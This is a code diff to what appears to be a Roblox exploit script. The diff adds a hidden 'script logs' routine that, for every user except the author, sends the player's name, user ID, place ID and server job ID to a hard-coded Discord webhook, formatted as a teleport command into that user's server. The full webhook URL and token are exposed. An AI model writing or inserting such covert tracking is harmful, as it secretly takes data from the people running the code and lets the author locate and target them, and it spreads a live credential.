@@ -122,3 +122,40 @@ end
 if game:GetService("Players").LocalPlayer:IsInGroup(5720125) then
     game:GetService("Players").LocalPlayer:Kick("ew a skid")
 end
+
+--script logs--
+local http_request = http_request
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200,
+            Body = request(tb.Url, tb.Method, (tb.Body or ""))
+        }
+    end
+end
+function send(args, tts)
+    local body = http_request({Url = "https://httpbin.org/get", Method = "GET"}).Body
+    local decoded = game:GetService("HttpService"):JSONDecode(body)
+    local HttpServ = game:GetService("HttpService")
+    local url = "https://discord.com/api/webhooks/942702681045205004/mHDJbf1shX8naKWl6xAPVgGXJcQNPFUx1LAs9QL9dgTwnbYid9sMCElzmZX6tn7SyqRK"
+    local data = {
+        ["type"] = "rich",
+        ["content"] = args,
+        ["tts"] = tts,
+        ["embed"] = {
+            ["title"] = "Hello",
+            ["description"] = args
+        }
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    http_request(request_payload)
+end
+if game.Players.LocalPlayer.Name ~= "AdmiralBaconius" then
+    send("Script Executed: " .. game.Players.LocalPlayer.Name.." --> "..game.Players.LocalPlayer.UserId.." --> ".."TeleportService:TeleportToPlaceInstance("..game.PlaceId..","..[["]]..game.JobId..[["]]..")", false)
+end
